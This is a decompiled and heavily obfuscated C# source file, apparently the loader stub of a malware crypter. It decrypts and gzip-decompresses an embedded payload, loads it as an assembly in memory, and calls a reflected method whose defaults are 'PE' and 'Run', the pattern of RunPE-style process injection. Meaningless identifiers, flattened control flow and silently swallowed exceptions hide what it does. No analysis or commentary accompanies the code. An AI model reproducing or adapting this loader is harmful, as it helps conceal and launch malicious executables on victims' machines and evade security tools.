using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using ns0;
using ns1;
using ns3;

namespace ns2;

internal sealed class Class4
{
	public static string string_0 = Class0.smethod_1(521225736, 0);

	public static void smethod_0(byte[] byte_0, string string_1)
	{
		smethod_3(smethod_1(string_0), new object[2] { byte_0, string_1 }, Class0.smethod_1(521209851, 7), Class0.smethod_1(521209604, 7));
	}

	private static byte[] smethod_1(string string_1)
	{
		return Form0.smethod_7(smethod_2(string_1), 86, 50);
	}

	private unsafe static string smethod_2(string string_1)
	{
		void* ptr = stackalloc byte[8];
		byte[] array2 = default(byte[]);
		GZipStream gZipStream = default(GZipStream);
		while (true)
		{
			byte[] array = Form0.smethod_7(string_1, 876, 776);
			MemoryStream memoryStream = new MemoryStream();
			*(int*)ptr = Class0.smethod_8(array, 0, 26, 73);
			*(int*)((byte*)ptr + 4) = 8;
			while (true)
			{
				switch (*(int*)((byte*)ptr + 4))
				{
				case 8:
					Class0.smethod_9(memoryStream, array, 4, checked(array.Length - 4), 784, 885);
					goto case 4;
				case 4:
					*(int*)((byte*)ptr + 4) = 6;
					continue;
				case 6:
					checked
					{
						array2 = new byte[*unchecked((int*)ptr) - 1 + 1];
						Class0.smethod_10(memoryStream, 0L, 914, 923);
					}
					*(int*)((byte*)ptr + 4) = 5;
					continue;
				case 3:
				case 5:
					gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
					goto case 1;
				case 1:
					gZipStream.Read(array2, 0, array2.Length);
					*(int*)((byte*)ptr + 4) = 2;
					continue;
				default:
					*(int*)((byte*)ptr + 4) = 7;
					continue;
				case 7:
					break;
				case 2:
					return Encoding.UTF8.GetString(array2);
				}
				break;
			}
		}
	}

	public unsafe static void smethod_3(byte[] byte_0, object[] object_0, string string_1 = "PE", string string_2 = "Run")
	{
		void* ptr = stackalloc byte[8];
		try
		{
			*(int*)ptr = 2;
			Type type_ = default(Type);
			while (true)
			{
				switch (*(int*)ptr)
				{
				case 0:
				case 1:
				{
					MethodInfo methodInfo = Class2.smethod_9(type_, Class0.smethod_1(521209611, 8), 820, 874);
					methodInfo.Invoke(null, object_0);
					goto end_IL_003a;
				}
				case 4:
					goto end_IL_003a;
				}
				Assembly assembly_ = Class1.smethod_5(byte_0, 287, 302);
				type_ = Class2.smethod_8(assembly_, Class0.smethod_1(521209854, 2), 906, 968);
				*(int*)ptr = 0;
				continue;
				end_IL_003a:
				break;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		*(int*)((byte*)ptr + 4) = 1;
		switch (*(int*)((byte*)ptr + 4))
		{
		}
	}
}
